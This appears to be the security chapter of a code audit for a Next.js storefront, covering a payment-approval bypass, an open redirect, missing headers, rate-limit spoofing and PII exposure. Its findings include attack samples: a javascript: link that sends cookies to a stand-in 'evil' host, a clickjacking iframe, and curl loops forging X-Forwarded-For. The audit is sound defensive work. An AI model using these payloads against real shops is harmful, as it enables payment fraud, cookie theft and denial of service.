# 06 — Security

Findings: `SEC-01` … `SEC-12`.

---

## 1. Threat-model summary

| Actor | Capabilities | Notes |
|---|---|---|
| Anonymous visitor | Browse, cart, guest checkout, order lookup (needs order number **and** email), analytics beacon | Can create DB rows without auth: `cart`, `cart_item`, `order`, `order_item`, `payment`, `analytics_event` |
| Authenticated customer | + wishlist, addresses, own order history | `role` is `input: false` in Better Auth (`lib/auth.ts:60-67`) — cannot be self-assigned at signup ✅ |
| Admin | Full CRUD, refunds, role changes | Granted only by seed or another admin; cannot change own role (`admin-users.ts:24`) ✅ |
| Stripe (or anyone posting to the webhook) | HMAC-verified events | Signature checked before any processing ✅ |
| **Anyone who learns an order UUID** | **Approve/decline the payment for that order** | ❌ **SEC-01** |

## 2. What is done correctly

Recorded so the implementing agent doesn't "harden" things that are already
right:

- **Passwords** — Better Auth's built-in scrypt. No custom crypto anywhere.
- **Session cookies** — managed by Better Auth (httpOnly, sameSite, `secure`
  derived from `baseURL`'s scheme). Not hand-rolled.
- **CSRF** — Next.js Server Actions carry built-in origin checks; Better Auth
  handles its own routes. The webhook is HMAC-authenticated, not
  cookie-authenticated, so it's not CSRF-able.
- **SQL injection** — impossible on current code. Every `sql` template
  interpolates drizzle column objects or bound parameters; no string
  concatenation of user input anywhere. Verified by reading all 16 query
  modules.
- **XSS** — React escapes by default. The single `dangerouslySetInnerHTML` is
  `components/json-ld.tsx:7`, and it escapes `<` → `<` before inlining,
  which correctly prevents `</script>` breakout. Verified.
- **Guest-cart cookie** — `HMAC-SHA256(token, BETTER_AUTH_SECRET)`, verified
  with `timingSafeEqual` and a length pre-check (`lib/guest-cart-cookie.ts:14-18`),
  `httpOnly`, `sameSite: lax`, `secure` in production. Invalid signature fails
  closed to "no cart", which is the right call for this asset class.
- **Admin authorization** — `requireAdmin()` is the **first statement** of all
  20 admin Server Actions and is called in all 12 admin page components.
  Middleware is explicitly a fast path only. Tested per module.
- **IDOR** — checked every parameterised mutation:
  - cart item update/remove scope by resolved `cartId` (`queries/cart.ts:189,208,215`) ✅
  - address update/delete scope by `userId` (`queries/addresses.ts:52,74`) ✅
  - wishlist remove resolves the user's own wishlist first (`wishlist.ts:41-46`) ✅
  - `getOrderForUser` returns `null` for another user's order, identical to
    "not found" (`orders.ts:232-236`) ✅ and is tested
  - admin actions are role-gated, so entity ids being guessable is moot ✅
- **Account enumeration** — Better Auth returns a non-persisted fake success
  on duplicate signup; the forgot-password form always shows the same
  confirmation (`forgot-password-form.tsx:29-38`); guest order lookup requires
  both order number and email and returns a single generic failure. ✅
- **No secrets in the repo** — `.gitignore` excludes `.env`, `.env.example`
  contains only placeholders, `.dockerignore` excludes env files. Verified by
  grepping the tree for key-shaped strings: the only hits are CI's
  deliberately-labelled `ci-only-secret-not-used-in-any-real-environment` and
  the Dockerfile's `docker-build-time-placeholder-not-a-real-secret`.
- **No SSRF via user input** — the only outbound fetches are to fixed provider
  endpoints. (`next/image` fetching admin-supplied URLs is the nearest thing;
  see IMG-01, which recommends removing that surface.)
- **No command injection** — `child_process` is never used.
- **No path traversal** — `S3Provider.upload` prefixes a UUID and sanitises
  the filename to `[a-zA-Z0-9.-]` (`packages/storage/src/providers/s3.ts:14-16,44`);
  S3 keys aren't filesystem paths.

---

## SEC-01 Mock payment approval is an unauthenticated Server Action that is live in every build

**Confidence: Confirmed**

### Localização

- `apps/web/lib/actions/mock-checkout.ts:22-37` (`approveMockPayment`)
- `apps/web/lib/actions/mock-checkout.ts:39-50` (`declineMockPayment`)
- `apps/web/app/(storefront)/checkout/mock/[token]/page.tsx:14-60`
- `apps/web/components/mock-checkout-actions.tsx:32`

```
Linha aproximada: mock-checkout.ts:22
```

### Problema

```ts
"use server";

export async function approveMockPayment(input: z.infer<typeof mockActionSchema>) {
  const { orderId, redirectUrl } = mockActionSchema.parse(input);
  const order = await getOrderById(db, orderId);
  if (order && order.status === "pending") {
    const outcome = await fulfillPaidOrder(db, {
      eventId: `mock_${orderId}_approved`,
      provider: "mock",
      orderId,
      providerRef: `mock_${orderId}`,
    });
    if (outcome.outcome === "paid") await sendOrderConfirmationEmail(orderId);
    …
  }
  redirect(redirectUrl);
}
```

There is **no** `requireUser()`, **no** ownership check, and — critically —
**no check of `env.PAYMENT_PROVIDER`**.

`PAYMENT_PROVIDER` is read in exactly one place in the entire codebase:
`apps/web/lib/payments.ts:11`, where it selects which provider *object* to
instantiate. The mock **page and Server Actions** are part of `app/` and are
therefore compiled, bundled and registered in Next's Server Actions manifest
in every build, regardless of the env var. Server Actions are addressable by
their generated id; a client that has ever loaded the mock page (or that
extracts the id from the build output) can invoke them directly.

`packages/payments/src/providers/mock.ts:13-16` asserts the opposite:

> *"the order id doubles as the token since it's already an unguessable uuid
> and **this path only ever runs with `PAYMENT_PROVIDER=mock`** (local dev /
> CI / demos), not a real-money flow."*

The second half of that sentence is not true of the route or the actions.

### Por que isso é um problema

Two distinct severities depending on deployment:

**(a) With `PAYMENT_PROVIDER=stripe` (the documented production config,
`runbook.md` step 6).** `approveMockPayment` calls `fulfillPaidOrder` — the
one function `CLAUDE.md` designates as the sole writer of `paid`:

> *"**Payment status only ever changes via a verified webhook**
> (`packages/payments`), never from a client redirect/return URL. This is the
> most common shortcut — do not take it, even temporarily."*

An attacker who obtains an order UUID can mark that order **paid**,
decrement stock, clear the cart and trigger a confirmation email — **with no
money having moved and no Stripe involvement at all**. This is a complete
bypass of the project's single non-negotiable rule.

**(b) With `PAYMENT_PROVIDER=mock` (the demo/self-host default).** Payments
are fake anyway, so the financial impact is nil — but it is still an
unauthenticated action that mutates another user's order, sends email to
another user's address, and decrements real stock.

### How an attacker gets an order UUID

The UUID is v4 and not brute-forceable, but it is not secret either:

1. **It is in the URL of the confirmation page** —
   `/order/confirmation/<orderId>` — which is not `noindex`ed
   (`app/robots.ts:10` omits `/order`, see SEC-08). Any browser extension,
   referrer header, shared screenshot, chat unfurl or support ticket leaks it.
2. **The guest order lookup returns it.** `lookupGuestOrderAction` returns
   `{ ok: true, orderId }` given an order number + email
   (`lib/actions/order-lookup.ts:14`). Order numbers are
   `MDV-YYYYMMDD-XXXXXXXX` with 4 random bytes — 4.3 billion per day, not
   guessable, but a *known* order number plus a known email is a very common
   combination (a shared receipt, a forwarded email).
3. **An admin can see every order id** at `/admin/orders`. A compromised or
   curious low-privilege staff account isn't needed — the ids are also in
   every `sendOrderConfirmationEmail` link (`lib/order-confirmation-email.ts:27`).
4. In case (b) specifically, the attacker is often the same person: a user can
   approve their **own** order without paying, which in a real-Stripe
   deployment (case a) is the whole exploit.

### Cenário que reproduz o problema

Deployment: `PAYMENT_PROVIDER=stripe`, real Stripe test/live keys.

1. Attacker places a legitimate order for $500 of goods and is redirected to
   Stripe's hosted checkout. They **do not pay**. The order exists as
   `pending`; they know its id because `successUrl` was built as
   `${NEXT_PUBLIC_APP_URL}/order/confirmation/${orderId}` and passed to Stripe
   as a query parameter they can read (`lib/actions/checkout.ts:66`).
2. Instead of paying, they navigate to
   `https://shop.example/checkout/mock/<orderId>?successUrl=https://shop.example/order/confirmation/<orderId>&cancelUrl=https://shop.example/checkout`.
3. The page renders — `getOrderById` finds the order, `order.status ===
   "pending"`, so `MockCheckoutActions` renders **Approve payment**.
4. They click it. `approveMockPayment` → `fulfillPaidOrder` → order is `paid`,
   stock decremented, cart cleared, confirmation email sent.
5. The admin sees a `paid` order in `/admin/orders` and ships it. Stripe shows
   no charge.

Note step 2 requires no tooling — it is a URL a user can type.

### Impacto

- **Segurança: crítico** — complete authentication and payment bypass
- **Correção: crítico** — orders marked paid with no payment; stock decremented
- Performance: nenhum
- Manutenção: alto
- **UX: crítico** — a merchant ships goods that were never paid for

### Severidade

**P0**

### Recomendação

Fix in this order — step 1 is a five-minute change that closes the hole:

1. **Gate on the env var at every entry point.** Immediately:
   ```ts
   // lib/actions/mock-checkout.ts — top of BOTH actions
   import { env } from "@/lib/env";
   if (env.PAYMENT_PROVIDER !== "mock") {
     throw new Error("Mock payment actions are disabled");
   }
   ```
   ```ts
   // app/(storefront)/checkout/mock/[token]/page.tsx — before anything else
   if (env.PAYMENT_PROVIDER !== "mock") notFound();
   ```
2. **Bind the action to the requester.** Even in mock mode, only the person who
   created the order should approve it. The order already knows its owner
   (`order.userId`) and its cart (`order.cartId`). Require **one** of:
   - the caller's session `userId` matches `order.userId`, or
   - the caller's guest-cart cookie token resolves to `order.cartId`.

   `resolveOwnerForRead()` (`lib/cart-owner.ts:14`) already produces exactly
   the value needed for the second check.
3. **Do not accept the redirect target from the client.** See SEC-02 — derive
   both URLs server-side from `env.NEXT_PUBLIC_APP_URL` and the order id.
4. **Structurally isolate the mock path** (ARCH-06): move approve/decline into
   a single Route Handler under `app/api/dev/mock-payment/` that 404s unless
   `PAYMENT_PROVIDER === "mock"`, so there is exactly one gate to maintain.
5. **Add a build-time assertion** to CI: fail the build if
   `PAYMENT_PROVIDER=stripe` and the mock route is reachable. A simple
   integration test covers this (below).

### Dependências

- Step 3 is **SEC-02**; do them in one edit.
- Step 4 is **ARCH-06**; do it after 1–3 are green.
- The E2E suite runs with `PAYMENT_PROVIDER=mock` (`playwright.config.ts:39`)
  and must keep passing — step 2 is the one that could break it. The purchase
  and admin journeys both approve their **own** order in the same browser
  context, so the guest-cart-token check will pass. Verify this before
  merging.

### Testes necessários

**Required before this can be marked done:**

1. Unit: with `PAYMENT_PROVIDER=stripe`, `approveMockPayment({orderId, …})`
   rejects, and the order's status and the variant's stock are both unchanged.
2. Unit: with `PAYMENT_PROVIDER=stripe`, rendering the mock page calls
   `notFound()`.
3. Integration: with `PAYMENT_PROVIDER=mock`, a caller whose session/guest
   token does **not** match the order's owner is rejected; the matching owner
   succeeds.
4. Integration: `declineMockPayment` gets the identical treatment (it can
   mark another user's payment `failed` — a denial-of-service on someone
   else's checkout).
5. E2E: the existing purchase and admin journeys still pass end to end.

---

## SEC-02 Open redirect (and a probable `javascript:` sink) through the mock-checkout redirect parameters

**Confidence: Confirmed** (open redirect) · **Likely** (`javascript:` XSS —
see verification)

### Localização

- `packages/payments/src/providers/mock.ts:20-24` — puts `successUrl` /
  `cancelUrl` into query params
- `apps/web/app/(storefront)/checkout/mock/[token]/page.tsx:19-24, 49, 53` —
  reads them from `searchParams`, passes them to the client component **and**
  renders `<Link href={successUrl}>`
- `apps/web/components/mock-checkout-actions.tsx:25, 32` — passes them back as
  `redirectUrl`
- `apps/web/lib/actions/mock-checkout.ts:14, 36, 49` —
  `redirectUrl: z.string().url()` then `redirect(redirectUrl)`

```
Linha aproximada: mock-checkout.ts:36
```

### Problema

The redirect targets are **round-tripped through the URL**. The page reads them
from `searchParams` and passes them straight to a Server Action that calls
`redirect()`. The only validation is `z.string().url()`, which accepts **any**
absolute URL — including a different origin, and including non-HTTP schemes.

`new URL("javascript:alert(1)")` succeeds, so `z.string().url()` accepts it.
The page also renders `<Link href={successUrl}>Continue</Link>` directly
(line 53) for already-processed orders, with no scheme check at all.

Two attacks:

**(a) Open redirect — Confirmed.**
`/checkout/mock/<orderId>?successUrl=https://phish.example/login&cancelUrl=…`
renders a page on the *real, trusted* shop origin, showing the *real* order
number and amount, with an **Approve payment** button that sends the victim to
an attacker-controlled site. Because the landing page is genuinely the
merchant's, every trust signal (domain, TLS, branding, correct order total) is
authentic. This is a high-quality phishing primitive, and combined with SEC-01
it also *approves the order* on the way out, so the victim sees a plausible
"payment succeeded, now confirm your details" flow.

**(b) `javascript:` XSS — Likely.** If React renders the `href` verbatim,
`<Link href="javascript:fetch('https://evil/'+document.cookie)">` executes on
click, in the shop's origin. React logs a warning for `javascript:` URLs but
historically still renders them.

### Verification

Before writing the fix, confirm (b) in React 19:
```
/checkout/mock/<a NON-pending order id>?successUrl=javascript:alert(1)&cancelUrl=/checkout
```
Click **Continue**. If an alert fires, (b) is Confirmed and this is P0-adjacent;
if React blanks the href, only (a) applies and P1 stands.

### Impacto

- **Segurança: alto** — phishing from a trusted origin; possible stored-XSS-
  grade impact if (b) confirms
- Correção: baixo
- Manutenção: baixo
- UX: baixo

### Severidade

**P1** (raise to **P0** if the `javascript:` variant confirms)

### Recomendação

**Do not accept redirect targets from the client at all.** They are entirely
derivable server-side:

1. In `MockProvider.createCheckoutSession`, stop putting the URLs in the
   query string. The mock page has the `orderId`; it can rebuild both:
   - success → `/order/confirmation/${orderId}`
   - cancel → `/checkout`
2. Remove `successUrl` / `cancelUrl` from `mockActionSchema` entirely; the
   actions take only `orderId` and redirect to a server-computed path.
3. If a caller-supplied target is ever genuinely needed (it isn't here, but
   the same pattern is about to be introduced by **BE-09**'s `redirectTo`),
   validate with a strict same-origin path check — never `z.string().url()`:
   ```ts
   const safePath = z.string()
     .regex(/^\/(?!\/)[A-Za-z0-9\-._~!$&'()*+,;=:@%/?#[\]]*$/, "must be a same-origin path");
   ```
   Reject anything starting with `//`, containing `\`, or with a scheme.
4. Never render an unvalidated URL as an `href`. Where a dynamic href is
   unavoidable (banner `ctaHref` — SEC-09), assert the scheme is `http`/`https`
   or the value is a relative path.

### Dependências

Same files as **SEC-01**; do them together. **BE-09** must adopt the same
`safePath` validator when it starts honouring `redirectTo`.

### Testes necessários

1. Unit: `approveMockPayment` no longer accepts a `redirectUrl` (compile-time)
   and always redirects to `/order/confirmation/<orderId>`.
2. Unit: the `safePath` validator rejects `https://evil.com`, `//evil.com`,
   `javascript:alert(1)`, `/\evil.com`, and accepts `/checkout`,
   `/account/orders/abc?x=1`.
3. E2E: the purchase journey still lands on the confirmation page.

---

## SEC-03 No security headers are set anywhere

**Confidence: Confirmed**

### Localização

- `apps/web/next.config.ts` — the whole file; there is no `headers()` function
- `apps/web/proxy.ts:14-24` — returns `NextResponse.next()`/`redirect()` with
  no header mutation
- No `vercel.json`, no reverse proxy config in either compose file

### Problema

`spec.md` §12 states: *"Security headers (CSP, X-Frame-Options,
Referrer-Policy) set at the framework level."* Grepping the repository for
`Content-Security-Policy`, `X-Frame-Options`, `Referrer-Policy`,
`Strict-Transport-Security`, `X-Content-Type-Options` and `Permissions-Policy`
returns **zero matches outside the spec document itself**.

Next.js sets `X-Powered-By` (unless disabled) and nothing else by default. So
in production the app ships with:

| Header | Present | Consequence |
|---|---|---|
| `Content-Security-Policy` | ❌ | No defence-in-depth against XSS; any injection (e.g. SEC-02b, SEC-09) has full script capability |
| `X-Frame-Options` / `frame-ancestors` | ❌ | The entire site is framable → clickjacking. The admin panel's destructive buttons (Refund, Delete, Demote) are one-click and unconfirmed (FE-07) — an ideal clickjacking target |
| `Referrer-Policy` | ❌ | Browsers default to `strict-origin-when-cross-origin`, so paths aren't leaked cross-origin — but `/order/confirmation/<uuid>` **is** leaked to any same-origin-ish/downgrade case and to any resource on the page. Combined with SEC-01 that URL is a capability |
| `Strict-Transport-Security` | ❌ | Vercel sets HSTS at the edge, so the primary target is covered; the **self-host** target (`docker-compose.prod.yml`, plain HTTP on :3000) is not |
| `X-Content-Type-Options: nosniff` | ❌ | MIME sniffing on uploaded content served from MinIO/Blob |
| `Permissions-Policy` | ❌ | Minor here |
| `X-Powered-By` | ✅ (present) | Version disclosure; `poweredByHeader: false` is a one-liner |

### Por que isso é um problema

CSP and `frame-ancestors` are the two controls that turn "an XSS exists" into
"an XSS exists but can't exfiltrate", and "an admin can be tricked into
clicking" into "an admin cannot be framed". This project has at least one
probable script-injection sink (SEC-02b), one admin-controlled `href` sink
(SEC-09), and a fully one-click-destructive admin UI. Missing headers is the
difference between a contained finding and a chained exploit.

For a portfolio project, it is also the single most visible security gap — it
takes ten seconds to check with `curl -I`.

### Cenário que reproduz o problema

```bash
curl -sI https://<deployed-host>/ | sort
```
No `content-security-policy`, no `x-frame-options`. Then:
```html
<!-- on attacker.example -->
<iframe src="https://<deployed-host>/admin/orders/<id>" style="opacity:0"></iframe>
```
The admin panel renders inside a hostile frame; overlay a decoy button over
**Refund**.

### Impacto

- Segurança: **alto** (defence-in-depth entirely absent; clickjacking live)
- Correção: nenhum
- Performance: nenhum
- Manutenção: baixo
- UX: nenhum

### Severidade

**P1**

### Recomendação

Add a `headers()` block to `apps/web/next.config.ts`. A CSP that works with
Next's inline bootstrap script needs a nonce, which requires generating it in
`proxy.ts` and threading it through — do it properly rather than falling back
to `unsafe-inline`:

1. **Start with the easy, non-breaking headers** (ship these first):
   ```ts
   const securityHeaders = [
     { key: "X-Frame-Options", value: "DENY" },
     { key: "X-Content-Type-Options", value: "nosniff" },
     { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
     { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
     { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" },
   ];
   ```
   plus `poweredByHeader: false`.
   `X-Frame-Options: DENY` is safe — nothing in this app is meant to be
   framed.
2. **Then CSP with a nonce.** In `proxy.ts`, generate a nonce per request, set
   it on the request headers and in the CSP response header; read it in the
   root layout via `headers()`. Note `proxy.ts`'s matcher currently covers only
   `/account`, `/admin`, `/wishlist` — a CSP nonce needs it to run on **all**
   routes, so the matcher must be widened (exclude `/_next/static`,
   `/_next/image`, favicon).
   Directives to start from, tightened to this app's actual dependencies:
   ```
   default-src 'self';
   script-src 'self' 'nonce-{nonce}' 'strict-dynamic';
   style-src 'self' 'unsafe-inline';                      # Tailwind injects styles
   img-src 'self' data: blob: https://picsum.photos https://*.public.blob.vercel-storage.com http://localhost:9000;
   font-src 'self';
   connect-src 'self' https://*.ingest.sentry.io;         # only if Sentry is configured
   frame-ancestors 'none';
   form-action 'self';
   base-uri 'self';
   object-src 'none';
   ```
   Derive `img-src` from the same shared hostname list as `next.config.ts`
   `remotePatterns` and IMG-01's validator — one source of truth.
3. **Roll CSP out in report-only first** (`Content-Security-Policy-Report-Only`)
   for one deploy, since Next 16 + Turbopack + `next/font` + Sentry's dynamic
   import all touch this.
4. Set HSTS only when `NEXT_PUBLIC_APP_URL` is `https://` — the self-host
   compose target serves plain HTTP on :3000 and would lock a developer out of
   `http://localhost:3000` otherwise.

### Dependências

- The `img-src` list depends on **CFG-02** (fixing the MinIO hostname) and
  shares a module with **IMG-01**. Do CFG-02 first.
- Widening the `proxy.ts` matcher affects **every** route — re-run the E2E
  suite after.

### Testes necessários

- Integration/E2E: assert each header is present on `/`, `/product/<slug>`,
  `/admin` and `/api/webhooks/stripe`.
- E2E: with CSP enforcing, the full purchase journey and the admin journey
  both complete with **zero** CSP violations in the console
  (`page.on("console")` assertion).
- Unit: HSTS is absent when `NEXT_PUBLIC_APP_URL` is `http://`.

---

## SEC-04 Rate limiting is keyed on a client-controlled header

**Confidence: Confirmed**

### Localização

- `apps/web/lib/actions/checkout.ts:22-25` (`getClientIdentifier`)
- `apps/web/app/api/webhooks/stripe/route.ts:19`

```ts
const h = await headers();
return h.get("x-forwarded-for")?.split(",")[0]?.trim() || h.get("x-real-ip") || "unknown";
```

### Problema

`X-Forwarded-For` is a request header. Whether it can be forged depends
entirely on the deployment:

- **Self-host (`docker-compose.prod.yml`)** — the app is exposed directly on
  `:3000` with **no reverse proxy in front**. Every byte of
  `X-Forwarded-For` comes from the client. Fully forgeable.
- **Vercel** — the platform sets `X-Forwarded-For`, but the documented
  behaviour is that a client-supplied value is **prepended/appended** rather
  than dropped. The code takes `split(",")[0]` — the **first** entry — which
  is the client-controlled end of the chain in the standard
  "client, proxy1, proxy2" ordering.

So `getClientIdentifier` returns whatever the attacker wants. Because
`MemoryRateLimiter`/`UpstashRateLimiter` key on that string:

- **Checkout limit (10/min) is bypassed completely.** Send a random
  `X-Forwarded-For` per request → a fresh bucket every time → unlimited
  checkout attempts. Each one creates an `order` + `order_items` + `payment`
  row (ECM-07), so this is an unauthenticated write amplification.
- **The webhook limiter can be weaponised.** It runs *before* signature
  verification (`route.ts:20`, a deliberate choice documented in `plan.md`
  §19). An attacker who guesses/learns the IP Stripe delivers from can spoof
  that value and burn the 100/min bucket, causing **legitimate Stripe webhooks
  to be 429'd**. Stripe retries, so this is degradation rather than loss — but
  it delays every order's `paid` transition and every confirmation email while
  it lasts.
- **Everyone shares one bucket by default.** With no proxy and no header, the
  identifier is the literal string `"unknown"` — so *all* traffic shares a
  single 10/min checkout bucket. That is a trivial denial of service: one
  script making 10 checkout calls per minute blocks every real customer.

### Cenário que reproduz o problema

```bash
# Bypass: unlimited checkouts
for i in $(seq 1 500); do
  curl -s -X POST https://shop.example/checkout \
    -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" \
    ... # Server Action invocation
done
```

```bash
# Denial of service in the no-proxy case: exhaust the shared "unknown" bucket
for i in $(seq 1 20); do curl -s -X POST http://selfhost:3000/checkout ... ; done
# Every subsequent real customer gets "Too many checkout attempts".
```

### Impacto

- Segurança: **alto** (the rate limiter is the only brake on unauthenticated
  order creation, and it doesn't work)
- Correção: médio (unbounded `pending` orders — compounds ECM-06/ECM-07)
- Performance: alto (write amplification)
- Manutenção: baixo
- UX: alto (the shared-bucket DoS blocks real checkouts)

### Severidade

**P1**

### Recomendação

1. **Make trust explicit.** Add `TRUSTED_PROXY_HOPS` (default `0`) to
   `lib/env.ts`. Parse `X-Forwarded-For` from the **right**, skipping that many
   trusted hops:
   ```ts
   function clientIpFromXff(xff: string | null, trustedHops: number): string | null {
     if (!xff) return null;
     const parts = xff.split(",").map(s => s.trim()).filter(Boolean);
     const idx = parts.length - 1 - trustedHops;
     return idx >= 0 ? parts[idx] ?? null : null;
   }
   ```
   With `TRUSTED_PROXY_HOPS=0` and no proxy, this returns the socket peer —
   which Next doesn't expose, so fall through to (2).
2. **Prefer a platform-provided, non-forgeable value where one exists.** On
   Vercel, `x-vercel-forwarded-for` / `x-real-ip` are set by the platform and
   cannot be overridden. Prefer those; fall back to the parsed XFF.
3. **Add a second, application-level key.** IP alone is the wrong identity for
   checkout anyway (NAT, mobile carriers). Key the checkout limiter on
   **`session.user.id` for authenticated users** and on the **guest-cart
   token** for guests — both are server-issued and HMAC-signed/opaque, and
   both are already resolved in `checkoutAction` before the limiter runs.
   Combine: `limit(userId ?? guestToken ?? ip)`.
4. **Never key on the literal `"unknown"`.** If no identity can be established,
   either fail closed (reject) or use a much tighter global bucket — do not
   let every anonymous request share one 10/min counter.
5. For the webhook: keep the pre-verification limiter but raise the ceiling
   and key it on a constant (e.g. `"stripe-webhook"`) with a limit sized to
   Stripe's real burst behaviour, so a forged header cannot starve the real
   deliveries. Alternatively, move the limiter *after* signature verification
   and accept the (cheap) HMAC cost — the signature check is the real gate.

### Dependências

None. `lib/rate-limit.ts` and the two call sites; `lib/env.ts` gains one var
that must be documented in `.env.example` and `runbook.md`.

### Testes necessários

- Unit: `clientIpFromXff("1.1.1.1, 2.2.2.2, 3.3.3.3", 0)` → `"3.3.3.3"`;
  with `1` → `"2.2.2.2"`.
- Integration: two checkout calls with different forged `X-Forwarded-For` but
  the same session/guest token share one bucket.
- Integration: 11 checkouts from one session in a minute → the 11th is
  `rate_limited`.
- Integration: the webhook limiter cannot be exhausted by requests carrying an
  arbitrary `X-Forwarded-For`.

---

## SEC-05 `/api/analytics/track` is unauthenticated, unrate-limited and writes to an unindexed table

**Confidence: Confirmed** · **Severidade: P2**

### Localização

`apps/web/app/api/analytics/track/route.ts:22-40`;
`packages/db/src/queries/analytics.ts:18-26`;
`packages/db/src/schema/ops.ts:47-55` (no indexes)

### Problema

Any client can POST an arbitrary funnel event, unlimited times:

```bash
while true; do
  curl -s -X POST https://shop.example/api/analytics/track \
    -H 'content-type: application/json' \
    -d '{"type":"checkout_completed","path":"/x"}'
done
```

Each request:
- mints an analytics session cookie if absent (`analytics-session.ts:14-27`),
- inserts one `analytics_event` row — a table with **no indexes and no
  retention** (DB-01, DB-09),
- and is accepted for **any** of the six event types, including
  `checkout_completed`.

Three consequences:

1. **Unbounded storage growth** driven by an anonymous actor.
2. **Analytics falsification.** `conversionFunnel` counts distinct
   `session_id`s. An attacker rotating the cookie can inflate any step
   arbitrarily — including reporting a 100% checkout-completion rate. For a
   dashboard whose entire purpose is decision support, forged data is worse
   than missing data.
3. **Progressive admin slowdown.** `conversionFunnel` does
   `count(distinct session_id)` over the whole table with a `created_at`
   filter it cannot index. Every injected row makes `/admin/analytics` slower,
   permanently.

The route is correctly written as best-effort (it never throws at the user,
`route.ts:35-37`), and losing analytics is genuinely not worth breaking a
page. That design is right; the missing controls are the problem.

### Recomendação

1. **Rate-limit it** using the existing `packages/ratelimit` provider — e.g.
   60/min keyed by the analytics session cookie, falling back to the (fixed)
   client identifier from SEC-04.
2. **Reject client-asserted milestones.** `add_to_cart` is already recorded
   server-side inside `addToCartAction` (`lib/actions/cart.ts:35`) — the right
   pattern. Do the same for `checkout_completed`: it is currently fired by
   `CheckoutCompletedBeacon` because *"that boundary has no cookies"*
   (`plan.md` §12). Instead, have the **confirmation page** (a Server
   Component, which has cookies) record it via a Server Action that verifies
   the order is actually `paid`. Then narrow the route's accepted `type` enum
   to `["page_view", "search_performed"]`.
3. **Cap payload size** — add `.max()` to `path` (already 2048 ✅) and reject
   bodies over a few KB.
4. **Retention + indexes** — DB-09, DB-01.
5. Consider dropping the row entirely when `type === "page_view"` and the same
   `(session_id, path)` was seen within N seconds, to blunt reload spam.

### Testes necessários

- Integration: 61 beacons in a minute from one session → the 61st is rejected
  and no row is written.
- Integration: POSTing `checkout_completed` to the route is rejected after the
  enum is narrowed.
- Integration: the server-side `checkout_completed` recorder refuses for an
  order that is not `paid`.

---

## SEC-06 Better Auth's cookie cache delays role revocation and session invalidation by up to 5 minutes

**Confidence: Likely** (depends on Better Auth's cookie-cache contents —
verification below) · **Severidade: P2**

### Localização

`apps/web/lib/auth.ts:47-52`

```ts
session: {
  cookieCache: { enabled: true, maxAge: 5 * 60 },
},
```

Consumed by `lib/auth-guards.ts:7` (`auth.api.getSession`), which every
`requireUser`/`requireAdmin` call goes through.

### Problema

Better Auth's cookie cache stores a signed copy of the session **and the user
object** in a cookie, so `getSession()` can answer without a database round
trip. `user.role` is registered as an additional field
(`lib/auth.ts:60-67`), so it is part of that cached payload.

For up to `maxAge` (300 s) after a change:

- A **demoted admin keeps admin access.** `setUserRoleAction` updates
  `user.role` in Postgres, but `requireAdmin()` reads the cached cookie. The
  demoted user can continue to refund orders, delete products and promote
  themselves back for five minutes. Note `setUserRoleAction` explicitly
  prevents self-demotion (`admin-users.ts:24`) precisely because losing admin
  access is considered serious — but *gaining* five minutes of stale admin
  after removal is not handled.
- A **revoked/expired session may still validate.** Signing out on one device
  does not invalidate a cached cookie held elsewhere until it expires.
- A **deleted user's session** remains valid for the window.

This is a deliberate, documented Better Auth performance feature, and 5
minutes is its own default. It is not a bug in Better Auth. It is a
*risk decision* this project never wrote down: `spec.md` §12 and `plan.md` §5
describe role checks as defence-in-depth *"every admin server action re-checks
the caller's role server-side"* — which is true syntactically but not
semantically, because "re-checks" reads a cache, not the database.

### Verification

Confirm the cache actually contains `role`:
1. Sign in as admin; note the `better-auth.session_data` cookie exists.
2. In `psql`: `UPDATE "user" SET role = 'customer' WHERE email = '<admin>';`
3. Immediately reload `/admin`. If it still renders, the finding is Confirmed.
4. Wait >5 minutes, reload — should now redirect to `/`.

### Recomendação

Choose based on how much the role-freshness matters:

- **(A) Cheapest, recommended:** keep `cookieCache` for `requireUser` but make
  `requireAdmin` bypass it. Better Auth's `getSession` accepts
  `query: { disableCookieCache: true }` — use it in `requireAdmin` only. Admin
  pages/actions are low-traffic; one extra query is free.
- **(B)** Reduce `maxAge` to 60 s. Reduces but does not remove the window.
- **(C)** Explicitly revoke sessions when a role changes: in
  `setUserRoleAdmin`'s transaction, delete the target user's `session` rows.
  Combine with (A) for a complete fix — (C) alone doesn't help while a cached
  cookie is still valid.

Do **(A) + (C)**, and document the remaining `requireUser` staleness window in
`plan.md` §5 as a conscious trade-off.

### Testes necessários

- Integration: demote an admin, then immediately call an admin Server Action
  as that user → rejected (no 5-minute window).
- Integration: demote an admin → their `session` rows are gone.
- Integration: `requireUser` still answers from the cache (assert the query
  count doesn't increase) for non-admin paths.

---

## SEC-08 The order confirmation page exposes full PII with no authentication and is crawlable

**Confidence: Confirmed** · **Severidade: P3**

### Localização

- `apps/web/app/(storefront)/order/confirmation/[id]/page.tsx:18-19`
- `packages/db/src/queries/orders.ts:192-229` (`getOrderById`, no ownership
  check — deliberate, documented)
- `apps/web/components/order-detail-card.tsx:43-52` (renders the address)
- `apps/web/app/robots.ts:10` (does not disallow `/order`)

### Problema

`/order/confirmation/<uuid>` renders, to anyone holding the URL: order number,
status, every line item with quantity and price, the full total, and the
complete shipping address (name, street, city, region, postal code, country).

The unguessable-UUID design is explicitly reasoned at `orders.ts:192-197` and
is a legitimate, industry-standard pattern (it is how emailed receipts work).
It is **not** the problem. The problems are the two things around it:

1. **The path is not disallowed in `robots.txt`.** If any confirmation URL is
   ever linked from an indexable page, or a crawler follows it from an email
   preview/URL-scanner, a page containing a customer's home address becomes
   indexable.
2. **The same URL is a payment capability** — see SEC-01. So a URL that leaks
   through a referrer, a screenshot, a support ticket or a shared browser
   history doesn't just expose data, it grants an action.

Contributing: no `Referrer-Policy` (SEC-03), so the URL is more leak-prone
than it needs to be.

### Recomendação

1. Add `/order/`, `/orders/`, `/checkout/mock` to `app/robots.ts` disallow
   (bundle with SEO-01).
2. Add `export const metadata = { robots: { index: false, follow: false } }`
   to the confirmation page itself — `robots.txt` is advisory; the meta tag is
   the stronger signal.
3. Set `Referrer-Policy: strict-origin-when-cross-origin` (SEC-03) so the URL
   is not sent to third-party resources.
4. Consider a shorter-lived capability: if the visitor has a session, prefer
   `/account/orders/<id>` (already ownership-checked); reserve the unguessable
   link for guests. Optional, but it narrows the window meaningfully.
5. Fixing **SEC-01** removes the "URL = payment capability" half entirely,
   which is the more important half.

